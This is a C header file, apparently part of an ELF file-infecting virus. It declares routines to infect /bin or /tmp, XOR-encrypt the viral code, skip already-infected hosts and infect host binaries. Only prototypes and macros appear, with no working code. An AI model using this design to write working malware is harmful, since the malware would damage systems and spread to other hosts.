// INFECTION_H

#ifndef INFECTION_H
#define INFECTION_H

// root and non-root DIR for infection
#define ROOT "/bin"
#define NON_ROOT "/tmp"

// Maximum size of the code to be infected
#define CODE_SIZE 512

// Infect different DIR
void InfectDifferentDirectories(char* argv[]);

// Bitwise XOR operation
void b_xor(unsigned char* xorcode, size_t size);

// Encrypts the code 
void encrypt_code(unsigned char* xorcode, size_t size, unsigned char* key, size_t keylen);

// encryption key
unsigned char* generateRandomKey(size_t size);

// Initialization Vector (IV)
unsigned char* generateRandomIV();

// Checks if ELF
int isELF(char* fileName);

// Checks if the given file is clean and not already infected
int isClean(char* fileName);

// Infects a host file
void InfectHostFile(char* hostFileName, int vfd);

#endif  // INFECTION_H
